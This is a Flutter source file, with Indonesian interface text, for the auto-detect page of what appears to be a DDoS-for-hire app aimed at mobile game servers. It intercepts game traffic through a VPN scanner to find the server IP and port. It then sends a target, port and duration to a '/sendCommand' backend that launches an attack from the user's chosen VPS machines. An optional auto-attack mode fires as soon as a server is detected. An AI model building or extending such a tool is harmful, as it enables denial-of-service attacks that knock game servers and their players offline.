import 'dart:async';
import 'dart:convert';
import 'dart:math' as math;
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_overlay_window/flutter_overlay_window.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'main.dart';
import 'base_page.dart';  // <-- TAMBAHKAN INI

// ─── Game Model ──────────────────────────────────────────────────────────────
class GameInfo {
  final String package_;
  final String name;
  final String icon;
  final Color color;
  bool selected;

  GameInfo({
    required this.package_,
    required this.name,
    required this.icon,
    required this.color,
    this.selected = true,
  });

  String get emoji {
    switch (icon) {
      case 'ml':     return '⚔️';
      case 'ff':     return '🔥';
      case 'roblox': return '🟥';
      case 'pubg':   return '🎯';
      case 'cod':    return '💀';
      case 'genshin':return '🌙';
      case 'coc':    return '🏰';
      case 'cr':     return '👑';
      case 'hsr':    return '🚂';
      case 'wr':     return '🗡️';
      default:       return '🎮';
    }
  }
}

// ─── Page ─────────────────────────────────────────────────────────────────────
class AutoDetectPage extends StatefulWidget {
  final String sessionKey;
  final List<Map<String, dynamic>> savedVPS;

  const AutoDetectPage({
    Key? key,
    required this.sessionKey,
    this.savedVPS = const [],
  }) : super(key: key);

  @override
  State<AutoDetectPage> createState() => _AutoDetectPageState();
}

class _AutoDetectPageState extends State<AutoDetectPage>
    with TickerProviderStateMixin {

  // ─── Channels ──────────────────────────────────────────────────────────
  static const _usageChannel   = MethodChannel('com.otax/usage_stats');
  static const _monitorChannel = MethodChannel('app_monitor_channel');
  static const _eventChannel   = EventChannel('app_events_channel');

  // ─── Animations ────────────────────────────────────────────────────────
  late AnimationController _radarController;
  late AnimationController _pulseController;
  late AnimationController _resultController;
  late Animation<double>   _pulseAnim;
  late Animation<double>   _resultAnim;

  // ─── State ─────────────────────────────────────────────────────────────
  List<Map<String, dynamic>> _vpsList    = [];
  List<Map<String, dynamic>> _selectedVPS = [];
  List<GameInfo> _installedGames = [];
  bool _loadingVPS   = true;
  bool _loadingGames = true;

  bool _overlayGranted    = false;
  bool _vpnGranted        = false;
  bool _usageStatsGranted = false;

  bool   _vpnScanActive  = false;
  String _detectedIP     = '';
  int    _detectedPort   = 0;
  String _detectedGame   = '';
  String _scanStatusText = 'Pilih game lalu tap SCAN';
  List<String> _scanLog  = [];

  int  _attackDuration = 60;
  int  _targetPort     = 10001;
  bool _autoAttack     = false;

  StreamSubscription? _eventSub;
  Timer? _gameCheckTimer;
  Timer? _logTimer;

  static const _scanMessages = [
    'Initializing VPN tunnel...',
    'Intercepting game traffic...',
    'Analyzing packet headers...',
    'Scanning port range...',
    'Monitoring connections...',
    'Deep packet inspection...',
    'Tracking UDP streams...',
    'Identifying game server...',
    'Resolving IP address...',
    'Filtering private ranges...',
  ];
  int _msgIdx = 0;

  @override
  void initState() {
    super.initState();
    _setupAnimations();
    _init();
  }

  void _setupAnimations() {
    _radarController = AnimationController(
      vsync: this, duration: const Duration(seconds: 2))..repeat();

    _pulseController = AnimationController(
      vsync: this, duration: const Duration(milliseconds: 1500))..repeat(reverse: true);
    _pulseAnim = Tween<double>(begin: 0.8, end: 1.0).animate(
      CurvedAnimation(parent: _pulseController, curve: Curves.easeInOut));

    _resultController = AnimationController(
      vsync: this, duration: const Duration(milliseconds: 600));
    _resultAnim = CurvedAnimation(parent: _resultController, curve: Curves.elasticOut);
  }

  Future<void> _init() async {
    await _checkPermissions();
    await _fetchVPSList();
    await _loadInstalledGames();
    _listenEvents();
    _monitorChannel.setMethodCallHandler((call) async {
      if (call.method == 'onMLIPFound') {
        final ip   = call.arguments['ip']?.toString() ?? '';
        final port = (call.arguments['port'] as int?) ?? 0;
        final game = call.arguments['game_name']?.toString() ?? '';
        _onIPFound(ip, port, game);
      }
    });
  }

  @override
  void dispose() {
    _radarController.dispose();
    _pulseController.dispose();
    _resultController.dispose();
    _eventSub?.cancel();
    _gameCheckTimer?.cancel();
    _logTimer?.cancel();
    _stopVpnScan();
    super.dispose();
  }

  void _listenEvents() {
    _eventSub = _eventChannel.receiveBroadcastStream().listen((e) {
      if (e is Map && e['type'] == 'ip_found') {
        _onIPFound(
          e['ip']?.toString() ?? '',
          (e['port'] as int?) ?? 0,
          e['game_name']?.toString() ?? '',
        );
      }
    });
  }

  void _onIPFound(String ip, int port, String game) {
    if (!mounted || ip.isEmpty) return;
    _resultController.forward(from: 0);
    setState(() {
      _detectedIP    = ip;
      _detectedPort  = port;
      _detectedGame  = game;
      _scanStatusText = '✅ Server ditemukan! Port: $port';
    });
    _addLog('🎯 Server: $ip:$port (real-time)');
    try {
      FlutterOverlayWindow.shareData({'type': 'ip_detected', 'ip': ip, 'port': port});
    } catch (_) {}
    if (_autoAttack && _selectedVPS.isNotEmpty) _launchAttack();
  }

  void _addLog(String msg) {
    if (!mounted) return;
    setState(() {
      _scanLog.insert(0, '${_timestamp()} $msg');
      if (_scanLog.length > 8) _scanLog.removeLast();
    });
  }

  String _timestamp() {
    final now = DateTime.now();
    return '[${now.hour.toString().padLeft(2,'0')}:${now.minute.toString().padLeft(2,'0')}:${now.second.toString().padLeft(2,'0')}]';
  }

  // ─── Permissions ───────────────────────────────────────────────────────
  Future<void> _checkPermissions() async {
    bool overlay = await FlutterOverlayWindow.isPermissionGranted();
    if (!overlay) overlay = await FlutterOverlayWindow.requestPermission() ?? false;

    bool vpn = false;
    try { vpn = await _monitorChannel.invokeMethod<bool>('checkVpnPermission') ?? false; } catch (_) {}

    bool usage = false;
    try { usage = await _usageChannel.invokeMethod<bool>('checkUsageStatsPermission') ?? false; } catch (_) { usage = true; }

    await Permission.notification.request();
    if (!mounted) return;
    setState(() { _overlayGranted = overlay; _vpnGranted = vpn; _usageStatsGranted = usage; });
  }

  Future<void> _requestVpnPermission() async {
    try {
      final r = await _monitorChannel.invokeMethod<bool>('requestVpnPermission') ?? false;
      if (!mounted) return;
      setState(() => _vpnGranted = r);
      if (!r) {
        await Future.delayed(const Duration(seconds: 2));
        final granted = await _monitorChannel.invokeMethod<bool>('checkVpnPermission') ?? false;
        if (mounted) setState(() => _vpnGranted = granted);
      }
    } catch (_) {}
  }

  // ─── Data ──────────────────────────────────────────────────────────────
  Future<void> _fetchVPSList() async {
    if (!mounted) return;
    setState(() => _loadingVPS = true);
    try {
      final res = await http.get(
        Uri.parse('$baseUrl/myServer?key=${widget.sessionKey}'),
      ).timeout(const Duration(seconds: 10));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body) as List;
        if (!mounted) return;
        setState(() => _vpsList = List<Map<String, dynamic>>.from(data));
      }
    } catch (_) {} finally {
      if (mounted) setState(() => _loadingVPS = false);
    }
  }

  Future<void> _loadInstalledGames() async {
    if (!mounted) return;
    setState(() => _loadingGames = true);
    try {
      final result = await _monitorChannel.invokeMethod<List>('getInstalledGames');
      if (result != null && mounted) {
        setState(() {
          _installedGames = result.map((g) {
            final map = Map<String, dynamic>.from(g as Map);
            return GameInfo(
              package_: map['package'] as String,
              name:     map['name'] as String,
              icon:     map['icon'] as String,
              color:    _gameColor(map['icon'] as String),
            );
          }).toList();
          _loadingGames = false;
        });
      }
    } catch (_) {
      if (!mounted) return;
      setState(() {
        _installedGames = [
          GameInfo(package_: 'com.mobile.legends', name: 'Mobile Legends', icon: 'ml', color: const Color(0xFF3D8BFF)),
          GameInfo(package_: 'com.dts.freefireth', name: 'Free Fire', icon: 'ff', color: const Color(0xFFFF6B35)),
          GameInfo(package_: 'com.roblox.client',  name: 'Roblox', icon: 'roblox', color: const Color(0xFFE53935)),
          GameInfo(package_: 'com.tencent.ig',     name: 'PUBG Mobile', icon: 'pubg', color: const Color(0xFFFFC107)),
          GameInfo(package_: 'com.activision.callofduty.shooter', name: 'COD Mobile', icon: 'cod', color: const Color(0xFF607D8B)),
        ];
        _loadingGames = false;
      });
    }
  }

  Color _gameColor(String icon) {
    switch (icon) {
      case 'ml':     return const Color(0xFF3D8BFF);
      case 'ff':     return const Color(0xFFFF6B35);
      case 'roblox': return const Color(0xFFE53935);
      case 'pubg':   return const Color(0xFFFFC107);
      case 'cod':    return const Color(0xFF607D8B);
      case 'genshin':return const Color(0xFF26C6DA);
      case 'coc':    return const Color(0xFF8BC34A);
      case 'cr':     return const Color(0xFF9C27B0);
      case 'hsr':    return const Color(0xFF7E57C2);
      case 'wr':     return const Color(0xFFF44336);
      default:       return Colors.grey;
    }
  }

  // ─── Scan ──────────────────────────────────────────────────────────────
  Future<void> _startVpnScan() async {
    if (_vpnScanActive) return;
    if (!_vpnGranted) {
      await _requestVpnPermission();
      if (!_vpnGranted) return;
    }

    final selectedPkgs = _installedGames
        .where((g) => g.selected)
        .map((g) => g.package_)
        .toList();

    if (selectedPkgs.isEmpty) {
      showCyberSnackBar(context, 'Pilih minimal 1 game untuk di-scan!', isError: true);
      return;
    }

    setState(() {
      _vpnScanActive  = true;
      _detectedIP     = '';
      _detectedPort   = 0;
      _detectedGame   = '';
      _scanStatusText = 'Memulai VPN scanner...';
      _scanLog.clear();
    });

    try {
      await _monitorChannel.invokeMethod('startVpnScan', {'packages': selectedPkgs});
      _addLog('🚀 Scanner aktif untuk ${selectedPkgs.length} game');

      _logTimer?.cancel();
      _logTimer = Timer.periodic(const Duration(seconds: 2), (_) {
        if (!_vpnScanActive || !mounted) { _logTimer?.cancel(); return; }
        _addLog('🔍 ${_scanMessages[_msgIdx % _scanMessages.length]}');
        _msgIdx++;
        if (_detectedIP.isEmpty) {
          setState(() => _scanStatusText = 'Buka game lalu mainkan...');
        }
      });

      _gameCheckTimer?.cancel();
      _gameCheckTimer = Timer.periodic(const Duration(seconds: 3), (_) async {
        try {
          final game = await _monitorChannel.invokeMethod<Map>('getRunningGame');
          if (!mounted) return;
          if (game != null) {
            final gameName = game['name']?.toString() ?? '';
            if (!gameName.isEmpty && mounted) {
              setState(() => _scanStatusText = '🎮 $gameName terdeteksi! Menunggu server...');
            }
            if (_overlayGranted) _showOverlay();
          }
        } catch (_) {}
      });
    } catch (e) {
      setState(() { _vpnScanActive = false; _scanStatusText = 'Error: $e'; });
    }
  }

  Future<void> _stopVpnScan() async {
    _logTimer?.cancel();
    _gameCheckTimer?.cancel();
    if (!_vpnScanActive) return;
    try { await _monitorChannel.invokeMethod('stopVpnScan'); } catch (_) {}
    if (mounted) {
      setState(() {
        _vpnScanActive  = false;
        _scanStatusText = 'Scan dihentikan';
      });
    }
  }

  Future<void> _showOverlay() async {
    if (!_overlayGranted) return;
    try {
      final isActive = await FlutterOverlayWindow.isActive();
      if (!isActive) {
        await FlutterOverlayWindow.showOverlay(
          height: 280, width: 260,
          alignment: OverlayAlignment.topLeft,
          flag: OverlayFlag.defaultFlag,
          overlayTitle: 'OTAX Scanner',
          overlayContent: 'Detecting...',
          enableDrag: true,
          positionGravity: PositionGravity.auto,
        );
      }
    } catch (_) {}
  }

  // ─── Attack ────────────────────────────────────────────────────────────
  Future<void> _launchAttack() async {
    if (_detectedIP.isEmpty || _selectedVPS.isEmpty) return;
    if (!_autoAttack) {
      final ok = await _showConfirmDialog();
      if (ok != true) return;
    }
    final effectivePort = _detectedPort > 0 ? _detectedPort : _targetPort;
    try {
      final res = await http.post(
        Uri.parse('$baseUrl/sendCommand'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'key': widget.sessionKey,
          'target': _detectedIP,
          'port': effectivePort,
          'duration': _attackDuration,
        }),
      ).timeout(const Duration(seconds: 10));

      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        _addLog('💥 Attack: ${data['message']}');
        showCyberSnackBar(context, '✅ ${data['message']}');
      } else {
        String error = 'Gagal: ${res.statusCode}';
        try {
          final err = jsonDecode(res.body);
          error = err['error'] ?? error;
        } catch (_) {}
        showCyberSnackBar(context, '❌ $error', isError: true);
      }
    } catch (e) {
      showCyberSnackBar(context, 'Error: $e', isError: true);
    }
  }

  Future<bool?> _showConfirmDialog() {
    final effectivePort = _detectedPort > 0 ? _detectedPort : _targetPort;
    final portLabel = _detectedPort > 0 ? '$_detectedPort ✅ auto-detect' : '$_targetPort ⚠️ fallback';
    return showDialog<bool>(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: AppColors.surface,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        title: Row(children: [
          const Text('⚡', style: TextStyle(fontSize: 24)),
          const SizedBox(width: 8),
          const Text('Launch Attack', style: TextStyle(color: AppColors.textPrimary, fontWeight: FontWeight.bold)),
        ]),
        content: Column(mainAxisSize: MainAxisSize.min, children: [
          _dRow('🎯 Target', _detectedIP),
          _dRow('🎮 Game', _detectedGame.isEmpty ? '-' : _detectedGame),
          _dRow('🔌 Port', portLabel),
          _dRow('⏱️ Durasi', '$_attackDuration detik'),
          _dRow('🖥️ VPS', '${_selectedVPS.length} server'),
        ]),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context, false),
              child: const Text('Batal', style: TextStyle(color: AppColors.textMuted))),
          ElevatedButton(
            onPressed: () => Navigator.pop(context, true),
            style: ElevatedButton.styleFrom(
              backgroundColor: AppColors.red,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
            ),
            child: const Text('🚀 LAUNCH'),
          ),
        ],
      ),
    );
  }

  Widget _dRow(String l, String v) => Padding(
    padding: const EdgeInsets.symmetric(vertical: 4),
    child: Row(children: [
      Text(l, style: const TextStyle(color: AppColors.textMuted, fontSize: 13)),
      const Spacer(),
      Text(v, style: const TextStyle(color: AppColors.textPrimary, fontWeight: FontWeight.bold, fontSize: 13)),
    ]),
  );

  // ─── BUILD ─────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return CyberScrollPageV2(
      title: "AUTO DETECT",
      child: Column(
        children: [
          _buildRadarSection(),
          const SizedBox(height: 16),
          _buildScanLog(),
          const SizedBox(height: 16),
          _buildGameSelector(),
          const SizedBox(height: 16),
          _buildVPSSection(),
          const SizedBox(height: 16),
          _buildBottomActions(),
        ],
      ),
    );
  }

  // ─── RADAR SECTION ─────────────────────────────────────────────────────
  Widget _buildRadarSection() {
    final hasIP = _detectedIP.isNotEmpty;
    return GlassCard(
      padding: const EdgeInsets.all(20),
      child: Column(
        children: [
          SizedBox(
            height: 160,
            child: Stack(
              alignment: Alignment.center,
              children: [
                ...List.generate(4, (i) => _radarRing(i, hasIP)),
                if (_vpnScanActive && !hasIP)
                  AnimatedBuilder(
                    animation: _radarController,
                    builder: (_, __) => CustomPaint(
                      size: const Size(180, 180),
                      painter: _RadarSweepPainter(_radarController.value),
                    ),
                  ),
                AnimatedBuilder(
                  animation: _pulseAnim,
                  builder: (_, child) => Transform.scale(
                    scale: _vpnScanActive ? _pulseAnim.value : 1.0,
                    child: child,
                  ),
                  child: Container(
                    width: 60, height: 60,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      gradient: RadialGradient(colors: hasIP
                          ? [AppColors.green, AppColors.green.withOpacity(0.3)]
                          : _vpnScanActive
                              ? [const Color(0xFF7C4DFF), const Color(0xFF1A0040)]
                              : [AppColors.surface2, AppColors.bg]),
                      boxShadow: [BoxShadow(
                        color: hasIP ? AppColors.green.withOpacity(0.5)
                            : _vpnScanActive ? const Color(0xFF7C4DFF).withOpacity(0.5)
                            : Colors.transparent,
                        blurRadius: 20,
                      )],
                    ),
                    child: Center(child: Text(
                      hasIP ? '✅' : _vpnScanActive ? '📡' : '🎮',
                      style: const TextStyle(fontSize: 28),
                    )),
                  ),
                ),
                if (hasIP)
                  Positioned(
                    bottom: 0,
                    child: ScaleTransition(
                      scale: _resultAnim,
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 6),
                        decoration: BoxDecoration(
                          color: AppColors.green.withOpacity(0.2),
                          borderRadius: BorderRadius.circular(20),
                          border: Border.all(color: AppColors.green.withOpacity(0.5)),
                        ),
                        child: Text(
                          '$_detectedIP : $_detectedPort',
                          style: const TextStyle(
                            color: AppColors.green,
                            fontWeight: FontWeight.bold,
                            fontSize: 13,
                            fontFamily: 'monospace',
                          ),
                        ),
                      ),
                    ),
                  ),
              ],
            ),
          ),
          const SizedBox(height: 12),
          Text(_scanStatusText,
            style: TextStyle(
              color: hasIP ? AppColors.green
                  : _vpnScanActive ? const Color(0xFFCE93D8) : AppColors.textMuted,
              fontSize: 13, fontWeight: FontWeight.w600,
            ),
            textAlign: TextAlign.center,
          ),
          if (_detectedGame.isNotEmpty) ...[
            const SizedBox(height: 8),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
              decoration: BoxDecoration(
                color: AppColors.accent.withOpacity(0.15),
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: AppColors.accent.withOpacity(0.4)),
              ),
              child: Text('🎮 $_detectedGame',
                style: const TextStyle(color: AppColors.accent, fontSize: 12, fontWeight: FontWeight.bold)),
            ),
          ],
          const SizedBox(height: 14),
          Row(children: [
            _statusChip('VPN', _vpnScanActive, _vpnScanActive ? '🟢' : '⚪'),
            const SizedBox(width: 8),
            _statusChip('Overlay', _overlayGranted, _overlayGranted ? '🟢' : '🔴'),
            const SizedBox(width: 8),
            _statusChip('Usage', _usageStatsGranted, _usageStatsGranted ? '🟢' : '🟡'),
          ]),
          const SizedBox(height: 14),
          GestureDetector(
            onTap: _vpnScanActive ? _stopVpnScan : _startVpnScan,
            child: Container(
              width: double.infinity,
              height: 48,
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: _vpnScanActive
                      ? [AppColors.red, AppColors.red.withOpacity(0.7)]
                      : [AppColors.accent, AppColors.accent.withOpacity(0.7)],
                ),
                borderRadius: BorderRadius.circular(14),
                boxShadow: [BoxShadow(
                  color: (_vpnScanActive ? AppColors.red : AppColors.accent).withOpacity(0.4),
                  blurRadius: 15,
                )],
              ),
              child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                Icon(_vpnScanActive ? Icons.stop_circle : Icons.radar,
                    color: Colors.white, size: 20),
                const SizedBox(width: 10),
                Text(
                  _vpnScanActive ? 'STOP SCAN' : 'MULAI SCAN',
                  style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w900,
                      fontSize: 14, letterSpacing: 1.5),
                ),
              ]),
            ),
          ),
        ],
      ),
    );
  }

  Widget _radarRing(int i, bool hasIP) {
    final size = 50.0 + i * 30.0;
    final color = hasIP ? AppColors.green : _vpnScanActive ? const Color(0xFF7C4DFF) : AppColors.textMuted;
    return AnimatedContainer(
      duration: const Duration(milliseconds: 300),
      width: size, height: size,
      decoration: BoxDecoration(
        shape: BoxShape.circle,
        border: Border.all(color: color.withOpacity(0.15 - i * 0.025), width: 1),
      ),
    );
  }

  Widget _statusChip(String label, bool active, String emoji) {
    return Expanded(child: Container(
      padding: const EdgeInsets.symmetric(vertical: 8),
      decoration: BoxDecoration(
        color: active ? AppColors.surface2 : AppColors.surface.withOpacity(0.5),
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: active ? AppColors.borderLight : AppColors.border),
      ),
      child: Column(children: [
        Text(emoji, style: const TextStyle(fontSize: 14)),
        const SizedBox(height: 2),
        Text(label, style: TextStyle(color: active ? AppColors.textSec : AppColors.textMuted, fontSize: 10)),
      ]),
    ));
  }

  // ─── SCAN LOG ──────────────────────────────────────────────────────────
  Widget _buildScanLog() {
    if (!_vpnScanActive && _scanLog.isEmpty) return const SizedBox();
    return GlassCard(
      padding: const EdgeInsets.all(12),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(children: [
            Container(width: 8, height: 8,
                decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: _vpnScanActive ? AppColors.green : AppColors.textMuted)),
            const SizedBox(width: 8),
            const Text('SCAN LOG', style: TextStyle(
                color: AppColors.green, fontSize: 10,
                fontWeight: FontWeight.bold, letterSpacing: 2)),
          ]),
          const SizedBox(height: 8),
          ..._scanLog.map((log) => Padding(
            padding: const EdgeInsets.only(bottom: 3),
            child: Text(log,
              style: TextStyle(
                color: log.contains('🎯') ? AppColors.green
                    : log.contains('💥') ? AppColors.orange
                    : AppColors.accent,
                fontSize: 11, fontFamily: 'monospace',
              ),
            ),
          )),
        ],
      ),
    );
  }

  // ─── GAME SELECTOR ────────────────────────────────────────────────────
  Widget _buildGameSelector() {
    return GlassCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(children: [
            const Text('🎮 Pilih Game Target',
                style: TextStyle(color: AppColors.textPrimary, fontWeight: FontWeight.bold, fontSize: 14)),
            const Spacer(),
            if (_loadingGames)
              const SizedBox(width: 14, height: 14,
                  child: CircularProgressIndicator(strokeWidth: 2, color: AppColors.accent)),
            if (!_loadingGames)
              GestureDetector(
                onTap: () => setState(() {
                  final allSelected = _installedGames.every((g) => g.selected);
                  for (var g in _installedGames) g.selected = !allSelected;
                }),
                child: Text(
                  _installedGames.every((g) => g.selected) ? 'Batal semua' : 'Pilih semua',
                  style: const TextStyle(color: AppColors.accent, fontSize: 12),
                ),
              ),
          ]),
          const SizedBox(height: 10),
          if (_installedGames.isEmpty && !_loadingGames)
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: AppColors.surface2,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: AppColors.border),
              ),
              child: const Center(child: Text(
                '⚠️ Tidak ada game yang terdeteksi terinstall',
                style: TextStyle(color: AppColors.textMuted, fontSize: 12),
              )),
            )
          else
            Wrap(
              spacing: 8, runSpacing: 8,
              children: _installedGames.map(_buildGameChip).toList(),
            ),
        ],
      ),
    );
  }

  Widget _buildGameChip(GameInfo game) {
    return GestureDetector(
      onTap: () => setState(() => game.selected = !game.selected),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
        decoration: BoxDecoration(
          gradient: game.selected
              ? LinearGradient(colors: [
                  game.color.withOpacity(0.3),
                  game.color.withOpacity(0.1),
                ])
              : null,
          color: game.selected ? null : AppColors.surface2.withOpacity(0.5),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(
            color: game.selected ? game.color.withOpacity(0.7) : AppColors.border,
            width: game.selected ? 1.5 : 1,
          ),
        ),
        child: Row(mainAxisSize: MainAxisSize.min, children: [
          Text(game.emoji, style: const TextStyle(fontSize: 16)),
          const SizedBox(width: 6),
          Text(game.name,
            style: TextStyle(
              color: game.selected ? AppColors.textPrimary : AppColors.textMuted,
              fontSize: 12, fontWeight: game.selected ? FontWeight.bold : FontWeight.normal,
            ),
          ),
          if (game.selected) ...[
            const SizedBox(width: 4),
            Icon(Icons.check_circle, size: 12, color: game.color),
          ],
        ]),
      ),
    );
  }

  // ─── VPS SECTION ──────────────────────────────────────────────────────
  Widget _buildVPSSection() {
    return GlassCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(children: [
            const Text('🖥️ Pilih VPS Attack',
                style: TextStyle(color: AppColors.textPrimary, fontWeight: FontWeight.bold, fontSize: 14)),
            const Spacer(),
            if (_loadingVPS)
              const SizedBox(width: 14, height: 14,
                  child: CircularProgressIndicator(strokeWidth: 2, color: AppColors.accent))
            else
              Text('${_vpsList.length} VPS',
                  style: const TextStyle(color: AppColors.textMuted, fontSize: 12)),
          ]),
          const SizedBox(height: 10),
          if (_loadingVPS)
            const Center(child: CircularProgressIndicator(color: AppColors.accent))
          else if (_vpsList.isEmpty)
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: AppColors.surface2.withOpacity(0.5),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: AppColors.border),
              ),
              child: Row(children: [
                const Icon(Icons.cloud_off, color: AppColors.textMuted, size: 20),
                const SizedBox(width: 10),
                const Expanded(child: Text('Tidak ada VPS', style: TextStyle(color: AppColors.textMuted, fontSize: 13))),
                GestureDetector(
                  onTap: _fetchVPSList,
                  child: const Text('Refresh', style: TextStyle(color: AppColors.accent, fontSize: 12)),
                ),
              ]),
            )
          else
            Column(
              children: _vpsList.map((vps) {
                final sel = _selectedVPS.any((v) => v['host'] == vps['host']);
                return _buildVPSItem(vps, sel);
              }).toList(),
            ),
        ],
      ),
    );
  }

  Widget _buildVPSItem(Map<String, dynamic> vps, bool selected) {
    return GestureDetector(
      onTap: () => setState(() {
        if (selected) _selectedVPS.removeWhere((v) => v['host'] == vps['host']);
        else _selectedVPS.add(vps);
      }),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        margin: const EdgeInsets.only(bottom: 8),
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
        decoration: BoxDecoration(
          gradient: selected ? LinearGradient(
            colors: [AppColors.accent.withOpacity(0.1), AppColors.surface2],
          ) : null,
          color: selected ? null : AppColors.surface2.withOpacity(0.5),
          borderRadius: BorderRadius.circular(14),
          border: Border.all(
            color: selected ? AppColors.accent.withOpacity(0.7) : AppColors.border,
            width: selected ? 1.5 : 1,
          ),
        ),
        child: Row(
          children: [
            Container(
              width: 36, height: 36,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: selected
                    ? LinearGradient(colors: [AppColors.accent, AppColors.accent.withOpacity(0.6)])
                    : null,
                color: selected ? null : AppColors.surface2,
              ),
              child: const Center(child: Icon(Icons.computer, size: 16, color: AppColors.textSec)),
            ),
            const SizedBox(width: 12),
            Expanded(child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(vps['alias'] ?? vps['host'] ?? '-',
                    style: TextStyle(
                      color: selected ? AppColors.textPrimary : AppColors.textSec,
                      fontWeight: selected ? FontWeight.bold : FontWeight.normal,
                      fontSize: 13,
                    )),
                Text('${vps['host']} • ${vps['username'] ?? 'root'}',
                    style: const TextStyle(color: AppColors.textMuted, fontSize: 11)),
              ],
            )),
            AnimatedContainer(
              duration: const Duration(milliseconds: 200),
              width: 20, height: 20,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: selected ? AppColors.accent : Colors.transparent,
                border: Border.all(
                  color: selected ? AppColors.accent : AppColors.textMuted, width: 1.5),
              ),
              child: selected
                  ? const Icon(Icons.check, size: 12, color: Colors.white)
                  : null,
            ),
          ],
        ),
      ),
    );
  }

  // ─── BOTTOM ACTIONS ───────────────────────────────────────────────────
  Widget _buildBottomActions() {
    final canLaunch = _detectedIP.isNotEmpty && _selectedVPS.isNotEmpty;
    final effectivePort = _detectedPort > 0 ? _detectedPort : _targetPort;
    return GestureDetector(
      onTap: canLaunch ? _launchAttack : null,
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 300),
        height: 54,
        decoration: BoxDecoration(
          gradient: canLaunch
              ? LinearGradient(
                  colors: [AppColors.red, AppColors.red.withOpacity(0.7)],
                  begin: Alignment.topLeft, end: Alignment.bottomRight)
              : null,
          color: canLaunch ? null : AppColors.surface2.withOpacity(0.5),
          borderRadius: BorderRadius.circular(16),
          boxShadow: canLaunch ? [BoxShadow(
            color: AppColors.red.withOpacity(0.4),
            blurRadius: 20,
          )] : [],
          border: canLaunch ? null : Border.all(color: AppColors.border),
        ),
        child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
          Text(canLaunch ? '⚡' : '🔒', style: const TextStyle(fontSize: 18)),
          const SizedBox(width: 10),
          Text(
            canLaunch
                ? 'LAUNCH ATTACK  ›  $_detectedIP:$effectivePort'
                : _vpnScanActive ? 'Mendeteksi server game...' : 'Mulai scan untuk deteksi IP',
            style: TextStyle(
              color: canLaunch ? Colors.white : AppColors.textMuted,
              fontWeight: FontWeight.w900,
              fontSize: 13, letterSpacing: 0.5,
            ),
          ),
        ]),
      ),
    );
  }
}

// ─── Custom Painter: Radar Sweep ──────────────────────────────────────────────
class _RadarSweepPainter extends CustomPainter {
  final double progress;
  _RadarSweepPainter(this.progress);

  @override
  void paint(Canvas canvas, Size size) {
    final center = Offset(size.width / 2, size.height / 2);
    final radius = size.width / 2;
    final angle  = progress * 2 * math.pi - math.pi / 2;

    final sweepPaint = Paint()
      ..shader = SweepGradient(
        startAngle: angle - 1.2,
        endAngle:   angle,
        colors: [
          Colors.transparent,
          const Color(0xFF7C4DFF).withOpacity(0.6),
        ],
      ).createShader(Rect.fromCircle(center: center, radius: radius))
      ..style = PaintingStyle.fill;

    canvas.drawArc(
      Rect.fromCircle(center: center, radius: radius),
      angle - 1.2, 1.2, true, sweepPaint,
    );

    final linePaint = Paint()
      ..color = const Color(0xFF7C4DFF).withOpacity(0.8)
      ..strokeWidth = 1.5
      ..style = PaintingStyle.stroke;

    canvas.drawLine(
      center,
      Offset(center.dx + radius * math.cos(angle),
             center.dy + radius * math.sin(angle)),
      linePaint,
    );
  }

  @override
  bool shouldRepaint(_RadarSweepPainter old) => old.progress != progress;
}